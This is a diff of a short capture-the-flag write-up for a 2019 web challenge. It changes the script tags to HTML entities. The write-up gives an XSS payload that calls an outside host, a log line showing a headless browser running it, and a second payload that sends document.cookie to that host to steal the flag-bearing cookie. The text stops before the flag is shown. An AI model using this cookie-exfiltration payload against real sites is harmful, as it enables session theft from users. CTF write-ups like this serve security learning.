@@ -1,22 +1,22 @@
 You need to get the flag from https://govagriculture.web.ctfcompetition.com/
 
 - It seems as there is no XSS Protection, so i tryed following text:
-> <script>
+> &lt;script&gt;
 > var xhttp = new XMLHttpRequest();
 > xhttp.open("GET", "https://mydomain.com/ctf", true);
 > xhttp.send();
-> </script>
+> &lt;/script&gt;
 
 - Looking at the logs, I can see that the code is being executed:
 > [22/Jun/2019:23:29:09 +0200] "GET /ctf HTTP/1.1" 200 8416 "https://govagriculture.web.ctfcompetition.com/pwn?msg=%3Cscript%3E%0D%0Avar+xhttp+%3D+new+XMLHttpRequest%28%29%3B%0D%0Axhttp.open%28%22GET%22%2C+%22https%3A%2F%2Fmydomain.com%2Fctf%22%2C+true%29%3B%0D%0Axhttp.send%28%29%3B%0D%0A%3C%2Fscript%3E" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3827.0 Safari/537.36"
 
 - So lets try to get the cookies
 
-> <script>
+> &lt;script&gt;
 > var xhttp = new XMLHttpRequest();
 > xhttp.open("GET", "https://mydomain.com/ctf?" + document.cookie, true);
 > xhttp.send();
-> </script>
+> &lt;/script&gt;
 
 - An there is our flag in the logs:
 
